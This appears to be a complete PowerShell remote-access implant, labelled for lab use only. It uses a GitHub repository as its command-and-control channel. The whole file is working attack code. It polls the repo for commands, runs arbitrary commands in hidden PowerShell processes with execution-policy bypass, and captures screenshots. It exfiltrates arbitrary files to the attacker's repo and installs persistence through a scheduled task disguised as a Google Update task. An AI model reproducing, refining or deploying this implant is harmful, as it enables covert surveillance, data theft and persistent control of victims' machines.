# ============================================================
# agent_gh2.ps1 - Implant GitHub resilient (iter 6, lab)
# - TLS 1.2 explicito
# - Todo try/catch individual: un fallo NO mata el agente
# - SIN Invoke-Expression: exec via temp .ps1 + powershell hijo
# USO EXCLUSIVO EN LAB AISLADO.
# Uso: powershell -f agent_gh2.ps1 -Pat <PAT> -Repo <owner/repo>
# ============================================================
param([string]$Pat, [string]$Repo)
$ErrorActionPreference = 'SilentlyContinue'
[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12

$hdr = @{
    Authorization = "Bearer $Pat"
    'User-Agent'  = 'gitpower-lab'
    Accept        = 'application/vnd.github+json'
}
$tag = "$env:COMPUTERNAME`_$env:USERNAME"
$api = "https://api.github.com/repos/$Repo/contents"
$last = ''
$dir = "C:\Users\Public\Music"

function GH([string]$m, [string]$u, [string]$b) {
    Invoke-RestMethod -Uri $u -Method $m -Headers $hdr -ContentType 'application/json' -Body $b
}

function PutOut([string]$name, [string]$c64, [string]$msg) {
    try {
        $body = @{ message = $msg; content = $c64 } | ConvertTo-Json -Compress
        GH PUT "$api/contents/out/$name" $body | Out-Null
    } catch {
        # el archivo existe: traer sha y reintentar
        try {
            $r = GH GET "$api/contents/out/$name" $null
            $body = @{ message = $msg; content = $c64; sha = $r.sha } | ConvertTo-Json -Compress
            GH PUT "$api/contents/out/$name" $body | Out-Null
        } catch { }
    }
}

function Txt64([string]$s) {
    [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($s))
}

PutOut "$tag-checkin_$(Get-Date -Format 'yyyyMMddHHmmss').txt" (Txt64 "[CHECKIN] $env:COMPUTERNAME\$env:USERNAME | agent_gh2") 'checkin'

while ($true) {
    try {
        $r = GH GET "$api/contents/cmd.txt" $null
        $cmd = [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String(($r.content -replace "`n", '')))
        if ($cmd -and $cmd -ne $last) {
            $last = $cmd
            $ts = [DateTimeOffset]::UtcNow.ToUnixTimeSeconds()
            $res = ''

            try {
                if ($cmd -eq 'SHOT') {
                    Add-Type -AssemblyName System.Windows.Forms
                    Add-Type -AssemblyName System.Drawing
                    $bounds = [Windows.Forms.Screen]::PrimaryScreen.Bounds
                    $b = New-Object System.Drawing.Bitmap($bounds.Width, $bounds.Height)
                    $g = [System.Drawing.Graphics]::FromImage($b)
                    $g.CopyFromScreen(0, 0, 0, 0, $b.Size)
                    $g.Dispose()
                    $ms = New-Object System.IO.MemoryStream
                    $enc = [Drawing.Imaging.ImageCodecInfo]::GetImageEncoders() | Where-Object { $_.MimeType -eq 'image/jpeg' }
                    $ep = New-Object System.Drawing.Imaging.EncoderParameters 1
                    $ep.Param[0] = New-Object System.Drawing.Imaging.EncoderParameter([System.Drawing.Imaging.Encoder]::Quality, [long]55)
                    $b.Save($ms, $enc, $ep)
                    PutOut "${tag}_$ts.jpg" ([Convert]::ToBase64String($ms.ToArray())) 'shot'
                    $res = '[+] shot exfil al repo'
                }
                elseif ($cmd -eq 'PROCS') {
                    $res = Get-Process | Select-Object Id, ProcessName | Out-String
                }
                elseif ($cmd -like 'LS *') {
                    $res = Get-ChildItem ($cmd.Substring(3)) -ErrorAction SilentlyContinue | Out-String
                }
                elseif ($cmd -like 'GETF *') {
                    $fp = $cmd.Substring(5)
                    $bytes = [IO.File]::ReadAllBytes($fp)
                    PutOut "${tag}_file_$ts.txt" ([Convert]::ToBase64String($bytes)) "file $fp"
                    $res = "[+] exfil: $fp ($($bytes.Length) b)"
                }
                elseif ($cmd -like 'MSG *') {
                    $t = $cmd.Substring(4)
                    $mf = "$env:TEMP\m_$ts.ps1"
                    Set-Content $mf "Add-Type -AssemblyName System.Windows.Forms; [Windows.Forms.MessageBox]::Show('$t','://msg')" -Encoding UTF8
                    Start-Process powershell -WindowStyle Hidden -ArgumentList "-nop -f `"$mf`""
                    $res = '[+] msgbox lanzado'
                }
                elseif ($cmd -eq 'PERSIST') {
                    $me = $PSCommandPath
                    schtasks /create /f /sc minute /mo 10 /tn 'GoogleUpdateTaskMachineWake{D1C79120-CA8D-6D04-AC55-11E498ABE7C3}' /tr "powershell -nop -w hidden -ep bypass -file `"$me`" -Pat `"$Pat`" -Repo `"$Repo`"" | Out-Null
                    $res = '[+] persistencia ok'
                }
                else {
                    # SIN Invoke-Expression: comando -> temp .ps1 -> hijo con output file
                    $tf = "$env:TEMP\t_$ts.ps1"
                    $of = "$env:TEMP\o_$ts.txt"
                    Set-Content $tf $cmd -Encoding UTF8
                    Start-Process powershell -ArgumentList "-nop -ep bypass -f `"$tf`"" -RedirectStandardOutput $of -Wait -WindowStyle Hidden
                    $res = Get-Content $of -Raw -ErrorAction SilentlyContinue
                    Remove-Item $tf, $of -Force -ErrorAction SilentlyContinue
                }
            } catch {
                $res = "ERR: $($_.Exception.Message)"
            }

            if ($res) {
                PutOut "${tag}_$ts.txt" (Txt64 "[$tag] > $cmd`n$res") 'res'
            }
        }
    } catch { }

    Start-Sleep -Seconds (Get-Random -Minimum 25 -Maximum 40)
}
